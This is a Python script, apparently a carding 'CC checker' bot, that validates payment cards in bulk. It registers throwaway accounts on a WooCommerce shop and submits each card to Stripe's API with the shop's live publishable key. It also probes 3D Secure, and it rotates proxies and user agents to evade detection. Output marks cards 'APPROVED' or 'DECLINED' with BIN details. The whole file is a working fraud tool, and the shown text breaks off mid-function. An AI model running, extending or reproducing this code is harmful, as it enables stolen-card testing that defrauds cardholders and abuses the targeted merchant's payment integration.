import requests
import os
import re
import random
import string
import time
import json
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Headers for Stripe request
stripe_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

def get_rotating_user_agent():
    """Generate different types of user agents"""
    agents = [
        generate_user_agent(device_type='desktop'),
        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
        generate_user_agent(device_type='desktop', os=('win',)),
        generate_user_agent(navigator='chrome'),
        generate_user_agent(navigator='firefox'),
    ]
    return random.choice(agents)

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def generate_random_email():
    """Generate random email for each account"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def parse_proxy(proxy_str):
    """Parse proxy string into components"""
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{ip}:{port}',
            'https': f'http://{username}:{password}@{ip}:{port}'
        }
    else:
        # If no auth, use without credentials
        ip, port = parts[0], parts[1]
        return {
            'http': f'http://{ip}:{port}',
            'https': f'http://{ip}:{port}'
        }

def load_proxies():
    """Load proxies from proxy.txt file"""
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def get_bin_info_reliable(bin_number):
    """ULTRA-RELIABLE BIN lookup using ONLY Binlist.net with aggressive retries"""
    if not bin_number or len(bin_number) < 6:
        return get_fallback_bin_info(bin_number)
    
    max_retries = 5  # Increased retries
    bin_code = bin_number[:6]
    
    print(f"🎯 ULTRA-RELIABLE BIN lookup for {bin_code} with {max_retries} retries...")
    
    for attempt in range(max_retries):
        try:
            print(f"🔍 BIN Attempt {attempt + 1}/{max_retries} using Binlist.net...")
            
            # Use ONLY Binlist.net API - THE WORKING ONE
            api_url = f'https://lookup.binlist.net/{bin_code}'
            
            headers = {
                'Accept': 'application/json',
                'Accept-Version': '3',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            print(f"🔄 Calling Binlist.net API: {api_url}")
            
            # STRATEGY: Use different approaches for different attempts
            use_proxy = attempt % 2 == 1  # Alternate between proxy and direct
            
            # Vary timeout based on attempt
            timeout_duration = 10.0 + (attempt * 5)  # Increase timeout with each retry
            
            if use_proxy:
                proxies_list = load_proxies()
                if proxies_list:
                    proxy_str = random.choice(proxies_list)
                    proxies = parse_proxy(proxy_str)
                    print(f"🔄 Using PROXY for BIN lookup: {proxy_str}")
                else:
                    proxies = None
                    print("🔄 No proxies available, using DIRECT connection for BIN lookup")
            else:
                proxies = None
                print("🔄 Using DIRECT connection for BIN lookup")
            
            response = requests.get(api_url, headers=headers, proxies=proxies, timeout=timeout_duration, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                print(f"📡 SUCCESS! Raw Binlist.net response: {data}")
                
                # PROPER PARSING for Binlist.net API response format
                bin_info = {
                    'bank': data.get('bank', {}).get('name', 'Unavailable'),
                    'country': data.get('country', {}).get('name', 'Unknown'),
                    'brand': data.get('scheme', 'Unknown').upper(),
                    'type': data.get('type', 'Unknown').upper(),
                    'level': 'UNKNOWN',  # Binlist.net doesn't provide level
                    'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                }
                
                # Enhanced cleaning with more variations
                for key in ['bank', 'country', 'brand', 'type']:
                    value = bin_info.get(key, '')
                    if not value or value in ['', 'N/A', 'None', 'null', 'Unavailable', 'Unknown', 'NULL']:
                        bin_info[key] = 'Unknown'
                
                # Special handling for brand/type
                if bin_info['type'] == 'DEBIT':
                    bin_info['type'] = 'DEBIT'
                elif bin_info['type'] == 'CREDIT':
                    bin_info['type'] = 'CREDIT'
                else:
                    bin_info['type'] = 'CREDIT/DEBIT'
                
                # DETERMINISTIC LEVEL DETECTION based on brand and first digits
                if bin_info['brand'] == 'VISA':
                    if bin_number.startswith(('4', '43', '45')):
                        bin_info['level'] = 'CLASSIC'
                    elif bin_number.startswith(('46', '47', '48')):
                        bin_info['level'] = 'GOLD'
                    elif bin_number.startswith(('49')):
                        bin_info['level'] = 'PLATINUM'
                    else:
                        bin_info['level'] = 'STANDARD'
                elif bin_info['brand'] == 'MASTERCARD':
                    if bin_number.startswith(('51', '52', '53', '54', '55')):
                        bin_info['level'] = 'STANDARD'
                    elif bin_number.startswith(('2221', '2720')):
                        bin_info['level'] = 'WORLD'
                    else:
                        bin_info['level'] = 'STANDARD'
                else:
                    bin_info['level'] = 'STANDARD'
                
                # ULTRA VALIDATION - Check if we got REAL data
                is_real_data = (
                    bin_info['bank'] not in ['Unavailable', 'Unknown', 'VISA BANK', 'MASTERCARD BANK'] and 
                    bin_info['brand'] != 'Unknown' and
                    bin_info['country'] not in ['UNITED STATES', 'Unknown'] and
                    len(bin_info['bank']) > 5 and  # Bank name should be meaningful
                    len(bin_info['country']) > 3   # Country name should be meaningful
                )
                
                if is_real_data:
                    print(f"✅ REAL BIN Info CAPTURED: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}")
                    print(f"✅ Bank: {bin_info.get('bank', 'UNKNOWN')} | Country: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}")
                    return bin_info
                else:
                    print(f"⚠️ Got questionable data from Binlist.net, validating...")
                    # Even if data seems incomplete, if we have brand and country, use it
                    if bin_info['brand'] != 'Unknown' and bin_info['country'] != 'Unknown':
                        print(f"🟡 Using PARTIAL BIN data: {bin_info['brand']} from {bin_info['country']}")
                        return bin_info
                    else:
                        print(f"🔄 Data too incomplete, retrying...")
                        
            elif response.status_code == 429:
                print("⚠️ Rate limit hit on Binlist.net, waiting longer...")
                # Longer wait for rate limits
                if attempt < max_retries - 1:
                    wait_time = (attempt + 1) * 8  # Much longer wait
                    print(f"⏳ Waiting {wait_time} seconds for rate limit cooldown...")
                    time.sleep(wait_time)
            elif response.status_code == 404:
                print("⚠️ BIN not found in Binlist.net database")
                # Don't retry for 404 - BIN simply doesn't exist
                break
            else:
                print(f"⚠️ Binlist.net API returned status {response.status_code}")
            
            # If API call failed, wait with exponential backoff + jitter
            if attempt < max_retries - 1:
                base_wait = (attempt + 1) * 4  # Exponential backoff
                jitter = random.uniform(1, 3)  # Random jitter
                wait_time = base_wait + jitter
                print(f"⏳ Strategic wait {wait_time:.2f} seconds before retry {attempt + 2}...")
                time.sleep(wait_time)
                
        except requests.exceptions.Timeout:
            print(f"⚠️ BIN lookup attempt {attempt + 1} timed out")
            if attempt < max_retries - 1:
                time.sleep(3)
        except requests.exceptions.ConnectionError:
            print(f"⚠️ BIN lookup attempt {attempt + 1} network error")
            if attempt < max_retries - 1:
                time.sleep(3)
        except Exception as e:
            print(f"⚠️ BIN lookup attempt {attempt + 1} failed: {str(e)}")
            if attempt < max_retries - 1:
                time.sleep(2)
    
    # FINAL FALLBACK: If all retries fail, use enhanced fallback
    print("❌ Binlist.net failed after all retries, using ENHANCED fallback BIN info")
    return get_enhanced_fallback_bin_info(bin_number)

def get_enhanced_fallback_bin_info(bin_number):
    """Enhanced fallback with better pattern recognition"""
    if not bin_number or len(bin_number) < 6:
        return get_fallback_bin_info(bin_number)
    
    # More sophisticated BIN pattern recognition
    first_six = bin_number[:6]
    
    # VISA patterns
    if bin_number.startswith('4'):
        # More specific VISA patterns
        if first_six.startswith(('4312', '4411', '4511')):  # Bank of America
            bank = 'BANK OF AMERICA'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif first_six.startswith(('4532', '4556', '4716')):  # Chase
            bank = 'JPMORGAN CHASE BANK'
            country = 'UNITED STATES' 
            emoji = '🇺🇸'
        elif first_six.startswith(('4024', '4175', '4408')):  # Wells Fargo
            bank = 'WELLS FARGO BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif first_six.startswith(('4147', '4744')):  # Citi
            bank = 'CITIBANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        else:
            bank = 'VISA BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        brand = 'VISA'
        
    # Mastercard patterns  
    elif bin_number.startswith('5'):
        if first_six.startswith(('5115', '5155', '5200')):  # Capital One
            bank = 'CAPITAL ONE'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif first_six.startswith(('5424', '5524')):  # US Bank
            bank = 'U.S. BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        else:
            bank = 'MASTERCARD BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        brand = 'MASTERCARD'
        
    # Other card types
    elif bin_number.startswith('34') or bin_number.startswith('37'):
        brand = 'AMEX'
        bank = 'AMERICAN EXPRESS'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    elif bin_number.startswith('6011') or bin_number.startswith('65'):
        brand = 'DISCOVER'
        bank = 'DISCOVER BANK'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    elif bin_number.startswith('35'):
        brand = 'JCB'
        bank = 'JCB CO. LTD'
        country = 'JAPAN'
        emoji = '🇯🇵'
    elif bin_number.startswith('62'):
        brand = 'UNIONPAY'
        bank = 'CHINA UNIONPAY'
        country = 'CHINA'
        emoji = '🇨🇳'
    else:
        brand = 'UNKNOWN'
        bank = 'UNKNOWN BANK'
        country = 'UNKNOWN'
        emoji = '🏳️'
    
    # Determine card level based on patterns
    if brand in ['VISA', 'MASTERCARD']:
        if bin_number.startswith(('4', '5')) and len(bin_number) >= 4:
            second_digit = bin_number[1] if len(bin_number) > 1 else '0'
            if second_digit in ['5', '6', '7', '8', '9']:
                level = 'PLATINUM'
            elif second_digit in ['3', '4']:
                level = 'GOLD'
            else:
                level = 'CLASSIC'
        else:
            level = 'STANDARD'
    else:
        level = 'STANDARD'
    
    # Determine type based on BIN patterns (simplified)
    card_type = 'CREDIT/DEBIT'
    if brand == 'AMEX':
        card_type = 'CREDIT'
    elif first_six.startswith(('4388', '4557')):  # Common debit prefixes
        card_type = 'DEBIT'
    
    return {
        'bank': bank,
        'country': country,
        'brand': brand,
        'type': card_type,
        'level': level,
        'emoji': emoji
    }

def get_fallback_bin_info(bin_number):
    """Basic fallback BIN info when everything fails"""
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
    
    # Basic pattern matching
    if bin_number.startswith('4'):
        brand = 'VISA'
        bank = 'VISA BANK'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    elif bin_number.startswith('5'):
        brand = 'MASTERCARD'
        bank = 'MASTERCARD BANK'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    elif bin_number.startswith('34') or bin_number.startswith('37'):
        brand = 'AMEX'
        bank = 'AMERICAN EXPRESS'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    elif bin_number.startswith('6'):
        brand = 'DISCOVER'
        bank = 'DISCOVER BANK'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    elif bin_number.startswith('35'):
        brand = 'JCB'
        bank = 'JCB CO. LTD'
        country = 'JAPAN'
        emoji = '🇯🇵'
    elif bin_number.startswith('62'):
        brand = 'UNIONPAY'
        bank = 'CHINA UNIONPAY'
        country = 'CHINA'
        emoji = '🇨🇳'
    else:
        brand = 'UNKNOWN'
        bank = 'UNKNOWN BANK'
        country = 'UNKNOWN'
        emoji = '🏳️'
    
    return {
        'bank': bank,
        'country': country,
        'brand': brand,
        'type': 'CREDIT/DEBIT',
        'level': 'STANDARD',
        'emoji': emoji
    }

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return '🏳️'
    
    try:
        # Convert to uppercase and get emoji
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return '🏳️'

def create_new_account_with_retry(session, proxy_str, max_retries=3):
    """Create a new account for each card with proxy and retry logic"""
    for attempt in range(max_retries):
        try:
            proxies = parse_proxy(proxy_str)
            
            # Step 1: Get login nonce
            login_page_res = session.get('https://orevaa.com/my-account/', proxies=proxies, timeout=30)
            
            login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
            if not login_nonce_match:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                return False, "Failed to get login nonce"
            login_nonce = login_nonce_match.group(1)

            # Step 2: Register a new account with random email ONLY
            random_email = generate_random_email()
            
            register_data = {
                'email': random_email, 
                'woocommerce-register-nonce': login_nonce,
                '_wp_http_referer': '/my-account/', 
                'register': 'Register',
            }
            
            reg_response = session.post('https://orevaa.com/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
            
            # Check if registration was successful
            if reg_response.status_code in [302, 303]:
                return True, "Account created"
            else:
                return True, "Account might be created"
                
        except Exception as e:
            if attempt < max_retries - 1:
                print(f"Account creation attempt {attempt + 1} failed, retrying...")
                time.sleep(2)
                continue
            return False, f"Account error: {str(e)}"

def get_payment_nonce_with_retry(session, proxy_str, max_retries=3):
    """Get payment nonce from the payment method page with proxy and retry logic"""
    for attempt in range(max_retries):
        try:
            proxies = parse_proxy(proxy_str)
            
            payment_page_res = session.get('https://orevaa.com/my-account/add-payment-method/', proxies=proxies, timeout=30)
            payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
            if not payment_nonce_match:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                return None, "Failed to get payment nonce"
            
            ajax_nonce = payment_nonce_match.group(1)
            return ajax_nonce, "Success"
        except Exception as e:
            if attempt < max_retries - 1:
                print(f"Payment nonce attempt {attempt + 1} failed, retrying...")
                time.sleep(2)
                continue
            return None, f"Payment nonce error: {str(e)}"

def stripe_api_call_with_retry(url, headers, data, proxies, max_retries=3):
    """Stripe API call with retry logic"""
    for attempt in range(max_retries):
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=30)
            return response
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < max_retries - 1:
                print(f"Stripe API attempt {attempt + 1} failed, retrying...")
                time.sleep(2)
                continue
            raise e

def get_3ds_challenge_mandated(website_response, proxy_str):
    """Extract acsChallengeMandated value from 3DS authentication response"""
    try:
        if not website_response.get('success'):
            return 'N'
            
        data_section = website_response.get('data', {})
        if data_section.get('status') != 'requires_action':
            return 'N'
            
        # Extract 3DS source directly from the website response
        next_action = data_section.get('next_action', {})
        if next_action.get('type') == 'use_stripe_sdk':
            use_stripe_sdk = next_action.get('use_stripe_sdk', {})
            three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
            
            print(f"DEBUG: Found 3DS source: {three_d_secure_2_source}")  # Debug line
            
            if three_d_secure_2_source:
                proxies = parse_proxy(proxy_str)
                headers = stripe_headers.copy()
                headers['user-agent'] = get_rotating_user_agent()
                
                # Call 3DS authenticate endpoint - EXACT payload as in your capture
                auth_data = {
                    'source': three_d_secure_2_source,
                    'browser': '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-GB","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-330","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"}',
                    'one_click_authn_device_support[hosted]': 'false',
                    'one_click_authn_device_support[same_origin_frame]': 'false',
                    'one_click_authn_device_support[spc_eligible]': 'true',  # Fixed this line
                    'one_click_authn_device_support[webauthn_eligible]': 'true',
                    'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
                    'key': 'pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO',
                    '_stripe_version': '2024-06-20'
                }
                
                print(f"DEBUG: Making authenticate request...")  # Debug line
                
                auth_response = stripe_api_call_with_retry(
                    'https://api.stripe.com/v1/3ds2/authenticate',
                    headers,
                    auth_data,
                    proxies
                )
                
                print(f"DEBUG: Auth response status: {auth_response.status_code}")  # Debug line
                print(f"DEBUG: Auth response text: {auth_response.text}")  # Debug line
                
                if auth_response.status_code == 200:
                    auth_data_response = auth_response.json()
                    ares = auth_data_response.get('ares', {})
                    acs_challenge = ares.get('acsChallengeMandated', 'N')
                    print(f"DEBUG: Extracted ACS Challenge: {acs_challenge}")  # Debug line
                    return acs_challenge
                else:
                    print(f"DEBUG: Auth request failed! Status: {auth_response.status_code}")
        
        return 'N'
        
    except Exception as e:
        print(f"3DS challenge check error: {str(e)}")
        return 'ACSFAILED'
        
def get_final_message(website_response, proxy_str):
    """Extract final user-friendly message from response with 3DS info"""
    try:
        if website_response.get('success'):
            data_section = website_response.get('data', {})
            status = data_section.get('status', '')
            
            if status == 'succeeded':
                return "Payment method successfully added."
            elif status == 'requires_action':
                # Get 3DS challenge mandated info directly from website response
                acs_challenge_mandated = get_3ds_challenge_mandated(website_response, proxy_str)
                return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}"
            else:
                return "Payment method status unknown."
        else:
            # Extract error message
            error_data = website_response.get('data', {})
            if 'error' in error_data:
                error_msg = error_data['error'].get('message', 'Declined')
                # Simplify common error messages
                if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
                    return "Your card's security code is incorrect."
                elif 'declined' in error_msg.lower():
                    return "Your card was declined."
                elif 'insufficient' in error_msg.lower():
                    return "Your card has insufficient funds."
                elif 'expired' in error_msg.lower():
                    return "Your card has expired."
                else:
                    return error_msg
            else:
                return "Card declined."
    except:
        return "Unknown response"

def check_card_stripe(cc_line):
    """Main function to check card via Stripe (single card) with retry logic"""
    start_time = time.time()
    max_retries = 3
    
    for retry_count in range(max_retries):
        try:
            # Parse CC
            n, mm, yy, cvc = cc_line.strip().split('|')
            if not yy.startswith('20'):
                yy = '20' + yy
            
            # FIRST: ULTRA-RELIABLE BIN LOOKUP FIRST (this might take longer but ensures data)
            print("🎯 STARTING ULTRA-RELIABLE BIN LOOKUP...")
            bin_start_time = time.time()
            bin_info = get_bin_info_reliable(n[:6])
            bin_time = time.time() - bin_start_time
            print(f"✅ BIN lookup completed in {bin_time:.2f} seconds")
            
            # Check if we got real BIN data or fallback
            if bin_info['bank'] in ['VISA BANK', 'MASTERCARD BANK', 'Unavailable', 'Unknown']:
                print("⚠️ Using enhanced fallback BIN data")
            else:
                print(f"✅ SUCCESS! Real BIN data captured in {bin_time:.2f}s")
                print(f"✅ Bank: {bin_info.get('bank', 'UNKNOWN')} | Country: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}")
            
            # Only proceed with card checking after BIN info is secured
            print("🔄 Proceeding with card verification...")
            
            # Load proxies
            proxies_list = load_proxies()
            if not proxies_list:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No proxies available
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            # Use random proxy
            proxy_str = random.choice(proxies_list)
            
            session = requests.Session()
            session.headers.update({
                'user-agent': get_rotating_user_agent()
            })

            if len(yy) == 4:
                yy_stripe = yy[-2:]
            else:
                yy_stripe = yy

            # Create a NEW account for this card with retry
            account_created, account_msg = create_new_account_with_retry(session, proxy_str)
            if not account_created:
                if retry_count < max_retries - 1:
                    print(f"Account creation failed, retry {retry_count + 1}/{max_retries}")
                    time.sleep(2)
                    continue
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            # Get payment nonce with retry
            ajax_nonce, nonce_msg = get_payment_nonce_with_retry(session, proxy_str)
            if not ajax_nonce:
                if retry_count < max_retries - 1:
                    print(f"Payment nonce failed, retry {retry_count + 1}/{max_retries}")
                    time.sleep(2)
                    continue
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            # Prepare Stripe data with the current card
            data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page=293254&client_attribution_metadata[client_session_id]=dd158add-28af-4b7c-935c-a60ace5af345&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=15bdff4a-ba92-40aa-94e4-f0e376053c81&guid=6238c6c1-7a1e-4595-98af-359c1e147853c2bbaa&muid=2c200dbe-43a4-4a5f-a742-4d870099146696a4b8&sid=a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20'

            proxies = parse_proxy(proxy_str)
            
            # Stripe API call with retry
            response = stripe_api_call_with_retry('https://api.stripe.com/v1/payment_methods', stripe_headers, data, proxies)

            # Check if response has 'id' before extracting
            response_data = response.json()
            
            if 'id' in response_data:
                pm_id = response_data['id']
                
                # Second request (admin ajax)
                headers2 = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.6',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://orevaa.com',
                    'priority': 'u=1, i',
                    'referer': 'https://orevaa.com/my-account/add-payment-method/',
                    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'sec-gpc': '1',
                    'user-agent': get_rotating_user_agent(),
                    'x-requested-with': 'XMLHttpRequest',
                }

                data2 = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': pm_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': ajax_nonce,
                }

                response2 = session.post('https://orevaa.com/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=30)
                website_response = response2.json()
                
                # Extract setup intent ID for 3DS check
                setup_intent_id = None
                if website_response.get('success'):
                    data_section = website_response.get('data', {})
                    setup_intent_id = data_section.get('id')
                
                # Get final message with 3DS info
                final_message = get_final_message(website_response, proxy_str)
                
                elapsed_time = time.time() - start_time
                
                # Check the actual status from the response
                if website_response.get('success'):
                    data_section = website_response.get('data', {})
                    status = data_section.get('status', '')
                    
                    if status == 'succeeded':
                        return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    elif status == 'requires_action':
                        return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    else:
                        return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

